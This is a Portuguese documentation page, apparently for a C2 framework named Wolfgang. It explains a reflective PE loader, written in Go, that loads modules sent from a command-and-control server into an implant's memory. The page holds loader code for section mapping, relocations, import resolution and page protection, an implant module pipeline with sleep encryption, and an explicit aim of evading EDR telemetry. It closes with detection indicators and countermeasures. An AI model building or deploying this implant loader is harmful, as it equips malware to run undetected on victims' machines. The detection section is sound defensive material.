    Reflective Loading¶

    O que é¶

    Reflective loading é a implementação de um PE loader completo em memória, capaz de carregar DLLs e executáveis sem usar as APIs padrão do Windows (LoadLibrary, LdrLoadDll). O loader do Wolfgang faz parse do PE, mapeia seções, aplica relocations, resolve imports e configura permissões de memória -- tudo sem tocar o disco ou gerar eventos de module load.

    Isso permite carregar módulos do C2 server diretamente na memória do implant, sem que eles apareçam na lista de módulos carregados do processo.

    Por que funciona¶

    Windows Loader vs Reflective Loader¶

    Quando o Windows carrega uma DLL via LoadLibrary:

    1. Lê o arquivo do disco
    2. Mapeia na memória via NtCreateSection + NtMapViewOfSection
    3. Registra o módulo no PEB (Process Environment Block)
    4. Gera um evento ETW de module load
    5. Notifica DLL load callbacks (registrados via LdrRegisterDllNotification)
    6. Chama DllMain(DLL_PROCESS_ATTACH)

    Cada um desses passos gera telemetria que EDRs consomem. O reflective loader bypassa todos:

    Passo Windows Loader Reflective Loader
    Leitura de disco Sim Nao (dados vêm da rede)
    Section mapping NtCreateSection VirtualAlloc
    Registro no PEB Sim Nao
    ETW module load event Sim Nao
    DLL load callbacks Sim Nao
    EDR visibility Total Nenhuma

    A desvantagem é que a memória resultante não tem backing em disco (unbacked), o que é detectável por heurísticas de memória.

    Implementação no Wolfgang¶

    Pipeline de carregamento¶

    O reflective loader está implementado em pkg/peparser/loader_windows.go:

    func ReflectiveLoad(peData []byte) (*LoadedModule, error) {
    // 1. Parse do PE
    pe, _ := Parse(peData)

    imageSize := uintptr(pe.OptionalHeader.SizeOfImage)
    preferredBase := uintptr(pe.OptionalHeader.ImageBase)

    // 2. Alocação de memória (tenta endereço preferido primeiro)
    base, err := windows.VirtualAlloc(preferredBase, imageSize,
        windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
    if err != nil {
        // Fallback para qualquer endereço
        base, _ = windows.VirtualAlloc(0, imageSize,
            windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
    }

    Mapeamento de seções¶

        image := unsafe.Slice((*byte)(unsafe.Pointer(base)), imageSize)

    // 3. Copia headers
    copy(image, peData[:pe.OptionalHeader.SizeOfHeaders])

    // 4. Mapeia cada seção no offset correto
    for _, sec := range pe.Sections {
        if sec.SizeOfRawData == 0 { continue }
        srcEnd := sec.PointerToRawData + sec.SizeOfRawData
        copy(image[sec.VirtualAddress:], peData[sec.PointerToRawData:srcEnd])
    }

    Relocations¶

    Quando o módulo é carregado em um endereço diferente do preferido, todos os endereços absolutos no código precisam ser ajustados:

        // 5. Aplica relocations se o base difere
    delta := int64(base) - int64(preferredBase)
    if delta != 0 {
        applyRelocations(pe, image, delta)
    }

    A implementação suporta dois tipos de relocation:

    func applyRelocations(pe *PE, image []byte, delta int64) error {
    relocData := image[dd.VirtualAddress : dd.VirtualAddress+dd.Size]
    relocs, _ := parseRelocations(relocData)

    for _, r := range relocs {
        switch r.Type {
        case 10: // IMAGE_REL_BASED_DIR64 (x64)
            val := binary.LittleEndian.Uint64(image[r.RVA:])
            val = uint64(int64(val) + delta)
            binary.LittleEndian.PutUint64(image[r.RVA:], val)

        case 3: // IMAGE_REL_BASED_HIGHLOW (x86/compat)
            val := binary.LittleEndian.Uint32(image[r.RVA:])
            val = uint32(int32(val) + int32(delta))
            binary.LittleEndian.PutUint32(image[r.RVA:], val)
        }
    }
    return nil
}

    Resolução de imports¶

    O loader resolve imports caminhando a Import Lookup Table (ILT) e preenchendo a Import Address Table (IAT):

    func resolveImports(pe *PE, image []byte, base uintptr) error {
    for i := uint32(0); ; i++ {
        // Parse do IMAGE_IMPORT_DESCRIPTOR
        descOffset := dd.VirtualAddress + i*20
        originalFirstThunk := binary.LittleEndian.Uint32(image[descOffset:])
        nameRVA := binary.LittleEndian.Uint32(image[descOffset+12:])
        firstThunk := binary.LittleEndian.Uint32(image[descOffset+16:])

        if originalFirstThunk == 0 && nameRVA == 0 { break }

        // Carrega a DLL dependente
        dllName := readCString(image, int(nameRVA))
        dll, _ := windows.LoadDLL(dllName)

        // Walk ILT e IAT em lockstep
        for j := uint32(0); ; j++ {
            entry := binary.LittleEndian.Uint64(image[iltRVA+j*8:])
            if entry == 0 { break }

            var proc *windows.Proc
            if entry>>63 == 1 {
                // Import by ordinal
                proc, _ = dll.FindProcByOrdinal(uintptr(entry & 0xFFFF))
            } else {
                // Import by name
                funcName := readCString(image, int(uint32(entry&0x7FFFFFFF)+2))
                proc, _ = dll.FindProc(funcName)
            }

            // Preenche IAT com o endereço real
            binary.LittleEndian.PutUint64(image[firstThunk+j*8:],
                uint64(proc.Addr()))
        }
    }
    return nil
}

    O mapeamento de characteristics para page protection:

    func sectionProtection(characteristics uint32) uint32 {
    r := characteristics&ImageSCNMemRead != 0
    w := characteristics&ImageSCNMemWrite != 0
    x := characteristics&ImageSCNMemExecute != 0

    switch {
    case x && w && r: return PAGE_EXECUTE_READWRITE
    case x && r:      return PAGE_EXECUTE_READ
    case w && r:      return PAGE_READWRITE
    case r:           return PAGE_READONLY
    default:          return PAGE_NOACCESS
    }
}

    Pipeline integrada com Module Cache¶

    Note over IMP: Quando módulo é necessário:
    IMP->>CACHE: cache.Get(name)
    CACHE-->>IMP: peData (decrypted)

    IMP->>LOADER: ReflectiveLoad(peData)
    LOADER-->>IMP: LoadedModule

    IMP->>CACHE: cache.SetRegion(name, base, size)
    Note over CACHE: Registra para sleep encryption

    IMP->>LOADER: module.CallDllMain()
    IMP->>LOADER: module.CallExport("Execute")

    Note over IMP: Quando não mais necessário:
    IMP->>LOADER: module.Unload()

    Detecção¶

    IOC Descrição
    Unbacked executable memory Regiões R-X sem corresponding file mapping
    VirtualAlloc + copy pattern Alocação seguida de escrita de PE headers
    MZ/PE header em heap/VirtualAlloc Assinatura de PE em memória não-mapeada
    Módulo não registrado no PEB Código executando de região não listada em _PEB_LDR_DATA
    LoadDLL para resolver imports Carregamento de DLLs por um módulo não-listado

    Contramedidas¶

    • Unbacked memory scanning: Enumerar regiões de memória e verificar se têm backing em disco (mais efetivo e comum)
    • PEB module list verification: Comparar módulos executando com lista do PEB
    • PE header scanning: Buscar MZ/PE signatures em regiões de heap
    • Import resolution monitoring: Detectar padrão de LoadDLL + GetProcAddress repetido para múltiplas DLLs

    Mitigações no Wolfgang¶

    • Module cache encryption: PE data armazenado cifrado com AES-256-GCM
    • Sleep encryption: Região do módulo incluída no sleep obfuscation cycle
    • Pode ser combinado com module stomping: Stomp após reflective load para obter backing em disco
